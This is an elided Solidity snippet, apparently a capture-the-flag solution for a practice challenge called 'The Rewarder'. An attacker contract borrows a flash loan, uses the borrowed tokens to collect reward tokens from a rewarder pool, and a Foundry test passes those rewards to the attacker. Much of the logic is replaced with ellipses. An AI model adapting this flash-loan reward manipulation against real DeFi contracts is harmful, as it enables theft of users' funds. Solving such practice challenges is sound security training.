...
contract AttackingContract {
    ...
    constructor(address _theRewarderPool, address _flashLoanerPool, address _dvt) {
    ...
    function startLoan(uint256 amount) public isOwner {
    ...
    function receiveFlashLoan(uint256 amount) external {
        ...
        RewardToken rewardTk = RewardToken(theRewarderPool.rewardToken());
        rewardTk.approve(owner, rewardTk.balanceOf(address(this)));
    }
}
...
contract TheRewarder is Test {
    ...
    function testExploit() public {
        ...
        AttackingContract at = new AttackingContract(address(theRewarderPool), address(flashLoanerPool), address(dvt));
        at.startLoan(dvt.balanceOf(address(flashLoanerPool)));
        RewardToken rewardTk = theRewarderPool.rewardToken();
        rewardTk.transferFrom(address(at), address(attacker), rewardTk.balanceOf(address(at)));
        vm.stopPrank();
        /**
         * EXPLOIT END *
         */
